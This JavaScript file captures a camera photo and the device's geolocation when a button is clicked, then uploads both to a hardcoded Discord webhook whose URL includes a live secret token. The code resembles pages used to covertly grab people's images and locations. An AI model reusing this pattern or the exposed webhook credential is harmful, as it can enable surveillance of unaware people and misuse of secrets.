document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureButton = document.getElementById('capture');
    const ctx = canvas.getContext('2d');
    
    // Request camera access
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // Update canvas size when video metadata is loaded
            video.addEventListener('loadedmetadata', () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
            });
        })
        .catch(error => {
            console.error('Error accessing camera:', error);
        });

    // Capture photo and location
    captureButton.addEventListener('click', () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
            // Get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const { latitude, longitude } = position.coords;
                    uploadPhoto(blob, latitude, longitude);
                }, error => {
                    console.error('Error getting location:', error);
                    uploadPhoto(blob, null, null); // Send null if location is not available
                });
            } else {
                console.error('Geolocation is not supported by this browser.');
                uploadPhoto(blob, null, null); // Send null if location is not supported
            }
        }, 'image/jpeg');
    });

    function uploadPhoto(blob, latitude, longitude) {
        const webhookUrl = 'https://discord.com/api/webhooks/1280950764810010714/06_wLRHD1JE46H9Rb9S5uZS5BQZfUxDlsLavx1_gw5DHq5KmT79Tto8J7YuehrW_Zr8l';

        const formData = new FormData();
        formData.append('file', blob, 'photo.jpg');

        // Send photo to Discord
        fetch(webhookUrl, {
            method: 'POST',
            body: formData,
        })
        .then(response => response.json())
        .then(data => {
            console.log('Photo upload success:', data);

            // Send location data
            if (latitude !== null && longitude !== null) {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `Location: Latitude ${latitude}, Longitude ${longitude}`
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Location upload success:', data);
                })
                .catch(error => {
                    console.error('Error uploading location:', error);
                });
            }
        })
        .catch(error => {
            console.error('Error uploading photo:', error);
        });
    }
});
